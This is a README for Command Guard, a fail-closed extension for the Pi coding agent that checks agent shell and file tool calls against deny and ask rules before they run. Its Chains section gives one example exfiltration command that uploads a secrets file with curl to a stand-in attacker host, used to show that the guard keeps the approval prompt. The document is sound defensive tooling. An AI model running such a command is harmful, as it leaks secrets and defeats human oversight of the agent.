# Command Guard

Command Guard is a fail-closed [Pi](https://github.com/earendil-works/pi)
extension that inspects `bash`, `read`, `edit`, and `write` tool calls before Pi
executes them. It blocks forbidden operations, asks for one-time approval for
risky operations, and lets unmatched calls proceed.

This repository is the authoritative home of the extension, its single editable policy
asset, and its regression tests.

## Repository layout

- `extensions/command-guard.ts` — extension entrypoint and evaluation order
- `extensions/command-guard/` — policy, path, matching, shell, and command
  analysis helpers
- `command-guard.json` — the only editable deny/ask policy asset
- `tests/` — unit, policy, relocation, and installed-Pi integration tests

The helper directory intentionally has no `index.ts`; Pi loads only the
entrypoint declared in `package.json`.

## Development

Requires Node 22.19 or newer.

```bash
npm ci
npm run check
npm run test:coverage
```

`npm run check` runs ESLint with zero warnings, strict TypeScript validation
(including all `.test.ts` suites), and the complete Node test suite.
`npm run test:coverage` runs the same suite with coverage limited to the
repository's extension sources. Tests and extension files run directly as
TypeScript on Node 22.19+; keep their syntax erasable (no runtime enums or
parameter properties), since Node strips types without compiling. Guard command
strings are parsed but never executed; lifecycle acceptance tests launch only
harmless synthetic Node test processes.

### Test fixture lifecycle

Writable fixtures use unique, test-owned directories from `os.tmpdir()` and are
removed after their test finishes, including ordinary assertion or setup failures
following allocation. The shared command-layout fixture is read-only during tests
and is removed by its suite's teardown. Mutable policies and relocated extension
copies never share a writable root between cases. Cleanup errors fail an otherwise
successful test and are diagnosed separately if a test has already failed.

To retain fixtures while debugging, opt in explicitly:

```bash
COMMAND_GUARD_KEEP_TEST_FIXTURES=1 npm test
```

Only the exact value `1` retains fixtures, for both passing and failing tests.
Each retained path is printed as a JSON-quoted diagnostic; no fixture contents are
printed. Unset the flag (or use any other value) for normal cleanup. The lifecycle
acceptance suite always removes its own disposable outer harness, including the
fixtures it intentionally retains to test this flag.

Temporary placement follows the environment (`TMPDIR` on macOS/Linux); tests do
not default to Workbench or require a machine-specific scratch path. Retained
temporary data may still be pruned by the environment. Copy useful evidence to an
investigation directory explicitly if it needs to persist.

Teardown cannot guarantee cleanup after SIGKILL, a process crash, or machine
shutdown. There is no age/prefix scavenger and no automatic retain-on-failure
mode. Existing retained Workbench data is not changed or removed by these tests.
The lifecycle tests cover real subprocess exits, synthetic HOME sentinels,
concurrent ownership, and symlink cleanup without targeting real user data.

ESLint uses `gts@7`'s Google-associated TypeScript rules and Prettier settings
in `.prettierrc.json`. This is a practical automated baseline, not full
coverage of the [Google TypeScript style guide](https://google.github.io/styleguide/tsguide.html).
The preset currently requires ESLint 9. Run `npm run lint` to check style;
keep exceptions scoped in `eslint.config.js`. Pi's required default extension
export remains unchanged.

The loader integration tests use the Pi dependency installed by `npm ci`. Set
`PI_PACKAGE_DIR` only when testing a different Pi checkout or installation.

Inspect package contents without publishing:

```bash
npm pack --dry-run
```

## Loading in Pi

Try a development checkout for one Pi invocation:

```bash
pi -e /absolute/path/to/command-guard
```

For the persistent installation, clone the repository into Pi's user extension
directory:

```bash
git clone https://github.com/KyleMyers001/command-guard.git \
  ~/.pi/agent/extensions/command-guard
```

Pi discovers the extension declared in the clone's `package.json`. Keep this
runtime clone clean and normally checked out on `main`. Develop in a separate
clone so uncommitted work cannot affect Pi.

Update the runtime clone explicitly:

```bash
git -C ~/.pi/agent/extensions/command-guard switch main
git -C ~/.pi/agent/extensions/command-guard pull --ff-only
```

Stop active sessions before replacing code or policy assets; stage and validate
the complete matching revision first, then restart/reload every affected session.
Do not change assets underneath an old loaded extension. The JSON policy is read
on each covered call, so valid edits apply immediately; code stays cached until
reload. Missing, unreadable, or invalid JSON fails closed with no fallback.
See the migration and rollback gates below before upgrading an older install.

### Testing a feature branch

Push the feature branch, then temporarily load its exact remote commit:

```bash
branch=feat/example
git -C ~/.pi/agent/extensions/command-guard fetch origin
git -C ~/.pi/agent/extensions/command-guard \
  switch --detach "origin/$branch"
```

Run `/reload` and perform non-destructive integration checks. Restore the stable
installation afterward, even when testing fails:

```bash
git -C ~/.pi/agent/extensions/command-guard switch main
git -C ~/.pi/agent/extensions/command-guard pull --ff-only
```

Run `/reload` again. If a feature version prevents Pi from starting, restore
`main` from an external terminal and restart Pi.

Do not load the runtime clone and a legacy extension symlink at the same time.
Two loaded guards can evaluate the same call and prompt twice.

## Evaluation order

1. Built-in protection prevents `edit` and `write` from changing guard-owned
   files (including `package.json`, which selects the loaded extension), helper
   directories, and the known legacy entrypoint alias.
2. Load and strictly validate `command-guard.json`; configuration errors block
   every covered tool. Startup reports unhealthy policy without quoting contents.
3. Command-analysis denies and JSON deny selectors block without an approval
   override.
4. Command-analysis asks and JSON ask selectors require approval for that exact
   invocation.
5. Otherwise the call proceeds.

Denial, cancellation, approval errors, invocation changes, and an unanswered
approval all block the call. An approval prompt waits 2 minutes by default; set
`COMMAND_GUARD_APPROVAL_TIMEOUT_S` (whole seconds, clamped to 10 s - 30 min) to
change that. Only a positive whole number counts: an unset, empty, zero,
negative, fractional, hex, exponent or text value (`1.5`, `1e3`, `0x10`,
`10s`) is invalid and uses the 2 minute default. A prompt that is not answered
in time is never treated as approval: silence blocks, and so does a "yes" that
arrives after the window has passed (measured on a monotonic clock; a clock
reading that is not a finite number counts as expired). Nothing runs, and the
guard tells the agent "Not approved in time; nothing ran. Skip it or ask the
user directly" so it moves on instead of asking again. Pi reports a "no" and a
lapsed dialog the same way, so a wait that used the whole window is worded as
not approved in time; any shorter "no" is reported as denied.

TUI and RPC modes use Pi's native confirmation UI. JSON and print modes block
asks because no approval UI is available. No session-wide approvals are
cached.

## Policy

Edit `command-guard.json` manually outside Pi. The policy has this shape:

```json
{
  "version": 1,
  "permissions": {
    "deny": [],
    "ask": []
  }
}
```

Supported selectors:

- `Bash`, `Read`, `Edit`, and `Write` match every call to that tool.
- `Edit` rules also cover `write`; `Write` rules remain write-specific.
- `Bash(pattern)` performs anchored full-command glob matching. `*` matches any
  text, including newlines; other characters are literal.
- `BashRegex(expression)` searches with a JavaScript regular expression using
  the `u` flag. Whole-expression `(?i:...)`, `(?m:...)`, and `(?im:...)`
  wrappers portably add case-insensitive, multiline, or both flags on Node
  22.19+; ordinary expressions do not implicitly enable either flag. For
  example, the JSON selector `"BashRegex((?m:^pass\\s+example$))"` matches
  a complete line inside a multiline command. Regexes have no stateful `g` or
  `y` flags. Other inline modifier forms depend on native runtime support.
- `BashRawRegex(expression)` uses exactly the same regex engine, `u` flag, and
  modifier support as `BashRegex`, but never sees flattened spellings. It
  checks the command exactly as written, the canonical text (one simple command
  per line) and each canonical line on its own. Because of the line-by-line
  check, a gap such as `[^;&|]*` cannot run from one command into the next; a
  custom regex that spans lines can still match inside the raw or joined
  canonical text. It is not literal-raw-only matching. Use it when
  whitespace/continuation provenance matters; the migrated historical denies
  use `BashRawRegex((?m:...))` to preserve their original matching scope.
- File selectors use `~/` for home, `//` for filesystem root, and relative paths
  for the current working directory. `*` stays within one segment; a complete
  `**` segment spans zero or more segments.

`Bash(pattern)` and `BashRegex(expression)` check raw and canonical spellings
and their flattened forms (backslash-LF/CRLF becomes a space, then runs of spaces
and tabs collapse). `BashRawRegex` checks the raw text, the canonical text and
each canonical line without those flattened forms; canonical command analysis is unchanged and can
itself normalize quoting and arguments.

Command analysis fails closed. When a command contains a construct the shell
scanner cannot be sure of (a process substitution `<(...)` / `>(...)`, an
unusual redirect operator, `case` inside a substitution, or an unbalanced quote
or parenthesis), the rules and classifiers also run on the guard's original
splitting of the same text, and the stricter verdict wins. Such a command is
never allowed when the original reading would have blocked it.
Selectors remain strings, not rule objects; there is no JSON `flatten` field or
generic flags API.

A single leading `/`, file-pattern `..`, character classes, `?`, braces,
parentheses, backslash escaping, partial `**` segments, unknown fields, and
unknown tools are rejected. File checks include Pi-style path normalization,
Unicode-equivalent spellings, read fallbacks, symlink targets, and existing
ancestors of new write targets.

To check a candidate policy before replacing the active file:

```bash
COMMAND_GUARD_POLICY=/path/to/candidate.json \
  npm test
```

Add or update a policy example whenever a rule changes. The examples and the
879-row migration contract pin ALLOW, ASK (including prompt count), and DENY
against the single JSON policy. The contract contains inputs and verdicts, not
a second regex list. Historical line numbers refer to the reviewed revision
`53b5bdc74ec81d20a34020399fc796035911e2b3`; tests never read the retired asset.

## Harmless commands that do not prompt

A few commands that a shipped ask rule matches run without a prompt. Their
grammar is code, defined once in `extensions/command-guard/exemptions.ts`, and
applies under any policy. Each grammar is positive: any extra option, quote,
escape, expansion, glob, or path outside it keeps the ask. Denies are never
narrowed.

- `rm` with only `-r`/`-R`/`-f`/`-v` flag groups, `--recursive`, `--force`, or
  `--verbose`, then one or more of `dist`, `build`, `out`, `target`,
  `node_modules`, `.next`, or `coverage`, each named bare (optionally `./`)
  with no directory part, `..`, quoting, glob, or trailing slash. GNU
  `rm -rf link/` empties a symlink's target and `rm -rf link/dist` crosses a
  symlinked ancestor, so `packages/app/dist` still asks.
- `gh api graphql` with at least one option, each of them: `-f`/`-F`/
  `--field`/`--raw-field` with a single-quoted literal `query=` (no `@file`
  and no `{owner}`/`{repo}`/`{branch}` placeholder) or a simple variable;
  `--paginate`, `--slurp`, `--silent`; `--cache <n>s|m|h`; or `--jq`/`-q` with
  a single-quoted or plain filter. A command mentioning `mutation` anywhere
  still asks, as do `--input`, `--hostname`, headers, `-X`, and any other option.
- Local `git merge` with literal arguments, except any `--no-v...` spelling
  (`--no-verify`). Pushes keep their rules.
- `git config` reads: optional `--global`, `--local`, `--system`, `--worktree`,
  `--show-origin`, `--show-scope`, `-z`, `--null`, then `--get`, `--get-all`,
  or `--get-regexp` with one key, or one of `--list`, `-l`, or a bare
  `section.key`. Writes, `-f`, and `-e` ask.
- `git checkout --detach <commit>` with literal arguments and none of `-b`,
  `-B`, `--orphan`, `-f`, `--force`, or `--`, when the working directory is
  known. Git refuses `--detach` with a path, so it cannot overwrite files.
- Every Git form above applies only when the sole options before the
  subcommand are `-C <plain literal path>` (no leading `-`, no `~`). Any other
  option in any quoting (`-c`, `--config-env`, `--git-dir`, `--work-tree`,
  `--exec-path`, `--no-pager`, ...) or a quoted or computed `-C` path keeps
  main's verdict.
- `curl` with only `-s`/`-S`/`-L`/`-f` flag groups, `--silent`,
  `--show-error`, `--location`, `--fail`, `--fail-with-body`, `--compressed`,
  `--retry`/`--max-time`/`-m`/`--connect-timeout <digits>`, one output given
  as `-o <file>` (also `-sLo`), `--output <file>`, or `--output=<file>`, and a
  public URL, as the last command. The file must be a literal relative data
  or archive file (`.json`, `.txt`, `.csv`, `.log`, `.tar`, `.gz`, `.tgz`,
  `.zip`, `.png`, `.jpg`, `.gif`, `.svg`, `.pdf`): at the repository root only
  with an output-style name (`out`, `output`, `download`, `data`, `result`,
  `response`, ...), otherwise up to three levels under `dist`, `build`, `out`,
  `tmp`, `artifacts`, or `downloads`. Names that may be config, manifests,
  locks, policy, credentials, or agent files ask. The URL must be `http(s)`
  with a DNS name whose last label is on a short public-TLD list (`com`,
  `org`, `net`, `io`, `dev`, `app`, `ai`, `co`, `gov`, `edu`, `us`, `uk`, `de`,
  `fr`, `ca`, `eu`, `jp`, `sh`, `me`); IP literals, embedded addresses,
  rebinding and tunnel domains, and credentials ask. Absolute paths, including
  `/tmp`, ask. A curl config file (`.curlrc` or `curlrc` under `$CURL_HOME`,
  `$XDG_CONFIG_HOME`, `~/.config`, or `~`) with any option outside a short
  allowlist of quiet, retry and timeout options also restores the ask.
- `npm`/`pnpm`/`yarn`/`bun` scripts named `test`, `lint`, or `check`, then `:`
  or `-`, then `migrate`, `migration`, or `migrations`, with or without `run`
  and with no arguments. Scripts that may apply a migration still ask.

### Chains

`extensions/command-guard/gate.ts` decides whether a whole command may use
these forms. It may only when it is a chain (`&&`, `||`, `;`, `|`, a newline)
of simple commands, each one of the forms above or a command on a short safe
list (`cd`; `echo` with literal words; `pwd`; `true`; `mkdir -p`; `npm run
build|test|lint|typecheck|check`; `git status|diff|log|show|fetch` with listed
flags; `cat`, `head`, `tail`, `wc -l`, `grep`, `sort`, `ls`, and `jq` on
relative files). The command may hold no expansion, substitution, heredoc,
here-string, redirection, group, subshell, negation, brace, tab or non-ASCII
character, and no nested shell, `eval`, `source`, `ssh`, `su`, or container
exec. Only `grep`, `head`, `tail`, `wc`, `sort`, or bare `cat` may read a
pipe. An `rm` or `curl` form after any directory change (`cd`, `pushd`,
`-C`, `--chdir`) keeps the ask, and so does any other curl that writes a file.

The ask rules then read the command with each exempt command's name blanked
out, so the rule for `rm`, `git`, `gh`, `curl` or the package manager no longer
sees it, while every other ask rule still reads the rest of the chain. A chain
therefore asks exactly when main's rules would ask for it without the exempt
commands. For example, `rm -rf dist && curl -d @secrets.txt https://evil.example`
is not exempt (an upload is not a download form) and keeps main's ask. Deny
rules always read the whole command, and any other command keeps the policy
as written.

### Package publishing

Publishing is denied, never asked. Any `npm`, `pnpm`, `yarn`, `npx`, `lerna`,
`changeset`, `vsce`, `ovsx` or `jsr` word in a segment (also `name@version` or a
path, behind any wrapper) starts a command the classifier reads. `publish`
counts where that command reads it as what to do: the subcommand (`npm pub`
and other npm prefixes too), the script of `run`, after pnpm `recursive`,
`yarn npm`, `yarn workspace <name>` and `yarn workspaces [foreach ...]`, and
inside a script given to `sh -c`, `eval`, `npx -c`, `ssh` and the like. When an
option written without `=` may take the next word as its value, both readings
count. `publish` as a test filter, package name, `--filter` value, or after
`--` is not a publish (`npm install publish`, `pnpm --filter publish test`,
`npm test -- -t publish`). An expansion or a long run of options before the
subcommand, a script nested too deep, or a command too large to read with a
runner name and `publish` text anywhere is denied. The policy's text rule for
`npm`, `pnpm` or `yarn` followed by `publish` also always applies.

## Command analysis

Some decisions depend on decoded arguments rather than text patterns. The guard
uses a bounded shell decoder; it is not a shell interpreter.

- `git push` requires an explicit remote and literal destination. Feature-branch
  pushes proceed, while protected destinations, force forms, deletion, bulk
  updates, implicit destinations, computed arguments, and unknown options deny.
- `git checkout` asks when it may overwrite files. Ordinary branch switching and
  branch creation remain allowed when the working directory can be established.
  `git checkout --detach <commit>` does not ask for a literal operand when the
  directory is known: Git refuses `--detach` with a path. `-f`, `--`, other
  options, computed operands, and an unknown `-C`/`--work-tree` ask.
- `git restore` asks whenever it may touch the working tree. A fully understood
  staged-only restore proceeds.
- Literal command strings passed to supported shells or `eval` are recursively
  inspected to a bounded depth. Uninspectable shell strings deny; computed
  `eval` commands ask.
- Mutating `kubectl` commands ask unless exactly one recognized client or server
  dry-run flag is present. Mutating `helm` commands always ask.

Git and GitHub global options, executable paths, selected wrappers, quoting,
line continuations, and GitHub API attached option values are canonicalized so
plain policy rules continue to match.

## Security limits

Command Guard is a tool-call guard, not a sandbox. A `Read` rule does not
restrict Bash, custom tools, or arbitrary extension code. Approved or unmatched
Bash can modify files that file-tool protection covers. Hard links, filesystem
races, later extensions rewriting input, Git aliases and configuration, remote
helpers, script files, and arbitrary shell expansion are outside its boundary.

Text rules can also match quoted mentions or miss unfamiliar wrappers. Use
server-side branch protection and operating-system isolation for controls that
must not depend on agent behavior. Never put secrets in policy selectors, test
fixtures, or tool arguments.

## Migrating an older installation

The single-policy revision retires `dangerous-patterns.txt`. All 36 historical
patterns move, in order, to the front of JSON denies using multiline raw/canonical
matching. The previous 66 deny and 50 ask selectors remain unchanged. Semantic
classifiers and built-in self-protection are still code, not editable regexes.
No permission relaxation, broad-mention fix, or Git-rule de-duplication is part
of this migration.

Before activation (separate from review, publication, and merge approval):

1. Inventory the actual target installation, loaded extensions, symlinks, and
   external consumers of the retired text asset, including other agents and
   `~/.agents/hooks/` readers. Do not remove another consumer's dependency until
   its own migration is approved. A permanent manually maintained copy is not
   a single source of truth.
2. Record the previous revision, symlink targets, Pi settings, and local policy
   customizations. Migrate custom patterns too; do not overwrite them blindly.
3. Stage the complete intended revision outside the live installation. Run
   `npm ci`, `npm run check`, `npm run test:coverage`, and inspect
   `npm pack --dry-run --json`. The package has one JSON policy and no text asset.
4. Obtain activation approval, then stop/pause all active Pi sessions before
   replacing the runtime revision and its assets together. Never delete an old
   loader's expected asset while that loader is running.
5. For a legacy symlink installation, record and remove the explicit extension
   settings entry and replace the old entrypoint/helper links with the verified
   runtime clone. Remove obsolete links only after the external-consumer gate.
   Do not load both the clone and the legacy extension alias.
6. Restart/reload every affected session against that complete revision. Verify
   exactly one loaded extension, healthy startup, repository-relative JSON,
   harmless ALLOW and declined ASK, and synthetic DENY through a non-executing
   harness. Validate native UI separately: mock confirmations do not prove
   dialog rendering. Never submit a destructive command to test a deny.

**Rollback:** From an external terminal, stop affected sessions and restore the
entire recorded previous revision, its matching policy assets (including the text
asset if the old loader expects it), customizations, settings, and symlink targets.
Restart/reload every session. Do not roll back only code or only JSON, and do not
assume another agent's removed links are disposable. Live installation and
cross-machine checks remain operator activation gates, not development-test claims.
